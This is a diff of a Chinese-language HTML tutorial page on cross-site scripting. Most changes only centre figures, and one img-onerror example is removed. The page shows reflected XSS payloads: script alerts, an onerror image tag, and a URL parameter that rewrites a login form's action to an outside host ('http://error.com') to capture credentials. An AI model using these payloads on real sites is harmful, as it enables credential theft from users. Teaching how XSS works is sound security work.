@@ -31,21 +31,17 @@
 		<section>
 			<h2>静态资源</h2>
 			<p>
-				在 HTML 页面（静态资源）中，有时候需要将用户输入的信息显示在页面上，如果通过 innerHTML 直接进行输出显示：<a href="../demo/xss_demo.html">点击试一试</a>
-				<figure>
+				在 HTML 页面（静态资源）中，有时候需要将用户输入的信息显示在页面上，如果直接进行输出显示：<a href="../demo/xss_demo.html">点击试一试</a>
+				<figure style="text-align: center;">
 					<img src="../images/xss_normal_input.jpg" alt="加载失败">
 					<figcaption class="description">正常输入</figcaption>
 					<img src="../images/xss_innormal_input.jpg" alt="加载失败">
 					<figcaption class="description">非正常输入</figcaption>
 				</figure>
 				用户输入的标签也会被当做 HTML 标签渲染出来，我们通常不希望进行这样的操作，此时就需要对用户输入的内容进行转移。不过，所幸的是，在自身页面进行 DOM 操作不能直接运行脚本。例如在文本框内输入<span class="definition"> &lt;script&gt;alert('hello world');&lt;/script&gt; </span>。
-				<figure>
+				<figure style="text-align: center;">
 					<img src="../images/xss_html_script.jpg" alt="加载失败">
 					<figcaption class="description">已写入文本，但页面不会弹窗（执行脚本）</figcaption>
-				</figure>
-				但可以换另一种方式来执行脚本代码，插入一个图片标签，设置错误的 src 导致触发 onerror 事件。此处添加的是<span class="definition"> &lt;img src=1 onerror=alert(1)&gt; </span>
-				<figure>
-					<img src="../images/xss_img_error.jpg" alt="加载失败">
 				</figure>
 			</p>
 		</section>
@@ -70,7 +66,7 @@
 				&lt;/html&gt;
 				</code></pre>
 				如果在 check.php 后面追加<span class="definition"> ?content=&lt;script&gt;alert(1);&lt;/script&gt; </span>
-				<figure>
+				<figure style="text-align: center;">
 					<img src="../images/xss_chrome.jpg" alt="加载失败">
 					<figcaption class="description">chrome 浏览器，umm....</figcaption>
 					<img src="../images/xss_ie.jpg" alt="加载失败">
@@ -109,16 +105,16 @@
 			&lt;/body&gt;
 			&lt;/html&gt;
 				</code></pre>
-				<figure>
+				<figure style="text-align: center;">
 					<img src="../images/xss_login_page.jpg" alt="加载失败">
 					<figcaption class="description">简单的登录页</figcaption>
 				</figure>
 				该网站的设计者出于某种原因将 usernamer 的键值直接显示在页面，攻击者可以在 URL 后追加<span class="definition">?username=用户&lt;script&gt;window.onload = function(){  var form = document.getElementById('form'); form.action = 'http://error.com'; }&lt;/script&gt;</span>。
-				<figure>
+				<figure style="text-align: center;">
 					<img src="../images/xss_becheat.jpg">
 					<figcaption class="description">诱导用户点击 URL </figcaption>
 				</figure>
-				<figure>
+				<figure style="text-align: center;">
 					<img src="../images/xss_login_demo.jpg" alt="加载失败">
 					<figcaption class="description">被更改后的目的地址</figcaption>
 				</figure>
